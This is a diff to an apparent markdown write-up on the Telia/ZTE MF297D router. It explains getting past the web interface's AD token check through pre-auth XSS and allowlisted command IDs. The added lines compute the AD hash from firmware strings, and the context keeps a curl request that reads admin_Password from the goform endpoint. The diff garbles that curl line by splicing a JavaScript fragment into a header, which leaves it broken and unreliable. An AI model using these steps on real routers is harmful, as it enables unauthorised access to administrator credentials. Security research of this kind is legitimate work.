@@ -27,6 +27,38 @@ There is a function called at `AD_hash_check_and_allowedlist`
 
 Depending on how strong the randomness of the `RD` value is, we could try to brute-force it, but we won’t focus on that here. Using pre-auth `XSS`, we can obtain RD value sending the request in Figure 27 and calculate the `AD` value. This function will return true also when the “goformId” value is one of the entries in the `g_set_commands_v`” array. If we choose one of these `ID`s, we don't need to care about the `AD` parameter in our request. After examining all related handlers for the above form `ID`s, something interesting stood out.
 
+
+
+### Developer Console (Temp Not Real Commands For TOKEN)
+
+![ad](https://user-images.githubusercontent.com/26827453/185768282-bcf6521c-617c-43f7-af4f-ffc68fef41ea.png)
+
+
+* Example usage, to be updated
+
+```json
+rd0
+'BD_TELIASEMF297DMODV1.0.0B03 [Jan  5 2022 18:02:19]'
+```
+
+```json
+rd1
+'MF297D_Nordic1_B05'
+```
+
+```json
+var AD_test=rd1+rd0
+```
+
+```json
+SHA256('AD_test')
+'C7BF4BBDBCD88D9D7F7C7B299C94E9E52091AF2FD2888ECF85A9D6A4160B4184'
+```
+```json
+b64_md5('AD_test')
+'4YLrvBZtczZueYaBOn/F8Q'
+```
+
 ### Login on router, no other methods works and the ones around the web is old, do as below for login:
 
 ##### Get Password for using instead of AD WebToken for Curl :)
@@ -35,7 +67,7 @@ Depending on how strong the randomness of the `RD` value is, we could try to bru
 admin_Password=$(curl -sL 'http://192.168.32.1/goform/goform_get_cmd_process?isTest=false&cmd=admin_Password' \
   -H 'Accept: application/json, text/javascript, */*; q=0.01' \
   -H 'Accept-Language: en-US,en;q=0.9,sv;q=0.8' \
-  -H 'Connection: keep-alive' \
+  -H 'Connectvar AD=SHA256('AD')ion: keep-alive' \
   -H 'Cookie: zwsd="9db95bed7fecf8c4305252a4f6e12411"' \
   -H 'Referer: http://192.168.32.1/' \
   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36' \
